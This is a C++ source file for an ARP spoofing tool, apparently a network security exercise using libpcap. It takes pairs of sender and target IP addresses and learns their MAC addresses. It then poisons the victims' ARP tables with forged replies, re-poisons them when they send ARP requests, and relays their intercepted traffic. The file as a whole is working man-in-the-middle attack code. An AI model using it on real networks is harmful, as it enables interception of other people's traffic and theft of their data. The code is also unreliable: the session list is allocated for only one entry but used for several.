#include "main.h"

int main(int argc, char **argv) {

    pcap_t *fp=nullptr;

    packet arp_packet;
    int sessioncnt;
    int arppackidx=-1;

    uint8_t broadcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    uint8_t unknown[6] = {0x00,0x00,0x00,0x00,0x00,0x00};


    uint8_t myIP[4];
    uint8_t myMAC[6];

    session **sessionlist;

    uint8_t packet[1500];
    uint8_t relay_packet[9001];

    char errbuf[PCAP_ERRBUF_SIZE];
    struct pcap_pkthdr* header;
    const u_char* recv_pack;



    if(argc < 4 || argc % 2 != 0){
        printf("Usage : ./arp_spoof <device> [<sender_ip> <target_ip> ...]\n");
        exit(0);
    }

    if ((fp = pcap_open_live(argv[1], 65535, 0, 1, errbuf)) == nullptr) {
        fprintf(stderr, "Unable to open adapter : %s\n", errbuf);
        exit(1);
    }

    sessionlist = reinterpret_cast<session **>( malloc(sizeof(session*)));
    sessioncnt = argc / 2 - 1;
    for(int j = 0 ; j < sessioncnt; ++j){
        sessionlist[j] = reinterpret_cast<session *>( malloc(sizeof(session)));
    }

    memset(packet, 0, sizeof(packet));      //initialize packet




    get_my_IP(argv[1], myIP);
    get_my_MAC(myMAC);

    for(int j = 0 ; j < sessioncnt ; j++){
        getIP(argv[j*2+2], sessionlist[j]->senderIP);
        getIP(argv[j*2+3], sessionlist[j]->targetIP);




        makeARPpacket(packet, broadcast, myMAC, 1, myMAC, unknown, myIP, sessionlist[j]->targetIP);
        sendPacket(fp,packet,sizeof(arp_packet));


        memset(packet, 0, sizeof(packet));

        while(true){
            int res = pcap_next_ex(fp, &header, &recv_pack);
            if(res == 0)continue;
            if (res == -1 || res == -2) break;
            if(checkARP(recv_pack, myIP, sessionlist[j]->targetIP) == 2){
                if(recv_pack[20] == 0x00 && recv_pack[21] ==0x02){
                    memcpy(sessionlist[j]->targetMAC, recv_pack+22,6);
                    break;
                }
            }
        }

        makeARPpacket(packet, broadcast, myMAC, 1, myMAC, unknown, myIP, sessionlist[j]->senderIP);
        sendPacket(fp,packet,sizeof(arp_packet));


        memset(packet, 0, sizeof(packet));


        while(true){
            int res = pcap_next_ex(fp, &header, &recv_pack);
            if(res == 0)continue;
            if (res == -1 || res == -2) break;

            if(checkARP(recv_pack, myIP, sessionlist[j]->senderIP) == 2){
                if(recv_pack[20] == 0x00 && recv_pack[21] ==0x02){
                    memcpy(sessionlist[j]->senderMAC, recv_pack+22,6);
                    break;
                }
            }
        }
    }




    printf("my MAC: ");
    for(int j = 0 ; j < 6 ; j++){
        printf("%02x ",myMAC[j]);
    }
    printf("\n");

    for(int k = 0 ; k < sessioncnt ; k++){
        printf("session %d\n", k+1);
        printf("target MAC: ");
        for(int j = 0 ; j < 6 ; j++){
            printf("%02x ",sessionlist[k]->targetMAC[j]);
        }
        printf("\n");

        printf("sender MAC: ");
        for(int j = 0 ; j < 6 ; j++){
            printf("%02x ",sessionlist[k]->senderMAC[j]);
        }
        printf("\n");
    }



    printf("Spoofing Victim's arp table...\n");
    for(int j = 0 ; j < sessioncnt ; j++){
        //packet, DestMac, SourceMac, opcode, SenderMac, TargetMac, SenderIp, TargetIP
        makeARPpacket(packet, sessionlist[j]->targetMAC, myMAC, 2, myMAC, sessionlist[j]->targetMAC, sessionlist[j]->senderIP, sessionlist[j]->targetIP);
        for(int k = 0 ; k < 5 ; k++){
            sleep(1);
            sendPacket(fp,packet,sizeof(arp_packet));
            arppackidx = j;
        }
    }



    while(true){
        int res = pcap_next_ex(fp, &header, &recv_pack);
        if(res == 0) continue;
        if (res == -1 || res == -2) break;
        for(int j = 0 ; j < sessioncnt ; ++j){
            switch(checkARP(recv_pack, sessionlist[j]->senderIP, sessionlist[j]->targetIP)){
                case 2:
                    printf("ReSpoofing session %d...\n", j+1);
                    if( arppackidx != j){
                        makeARPpacket(packet, sessionlist[j]->targetMAC, myMAC, 2, myMAC, sessionlist[j]->targetMAC, sessionlist[j]->senderIP, sessionlist[j]->targetIP);
                    }
                    sendPacket(fp,packet,sizeof(arp_packet));
                    arppackidx = j;
                    break;
                case 1:
                    continue;
                case 0:
                    if(checkDestMAC(recv_pack,myMAC)){
                        for(;j<sessioncnt;++j){
                            if(checkSourceMac(recv_pack, sessionlist[j]->targetMAC)){
                                memcpy(relay_packet, recv_pack, header->caplen);
                                spoofHeader(relay_packet, sessionlist[j]->senderMAC, myMAC);
                                sendPacket(fp,relay_packet, header->caplen);
                                break;
                            }else{
                                continue;
                            }
                        }
                    break;
                    }

            }
        }



    }
    for(int j = 0 ; j < sessioncnt ; ++j){
        free(sessionlist[j]);
    }
    free(sessionlist);
    printf("Done");
    return 0;
}
